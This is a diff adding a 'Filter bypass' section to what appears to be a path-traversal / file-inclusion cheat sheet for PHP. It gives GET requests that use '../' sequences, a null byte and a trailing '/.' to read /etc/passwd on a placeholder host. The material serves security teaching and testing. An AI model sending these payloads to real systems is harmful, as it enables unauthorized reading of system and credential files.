@@ -36,3 +36,18 @@ Could be vulnerable to an attack like this. (Fixed in PHP 5.3.4 and above.)
 ```HTTP
 GET http://site.com/index.php?filename=../../../../etc/passwd%00
 ```
+
+### Filter bypass
+It's possible that there's a filter applied that disallowes files. In that case it could be possible to bypass the filter by sending a null byte `(%00 or 0x00)` or by adding the current directory `(.)` to the end of the file path. 
+
+If there's for example a filter disallowing the `/etc/passwd` file it might be possible to bypass it with one of these requests.
+
+**Null Byte**
+```HTTP
+GET http://site.com/index.php?filename=../../../../etc/passwd%00
+```
+
+**Current directory**
+```HTTP
+GET http://site.com/index.php?filename=../../../../etc/passwd/.
+```
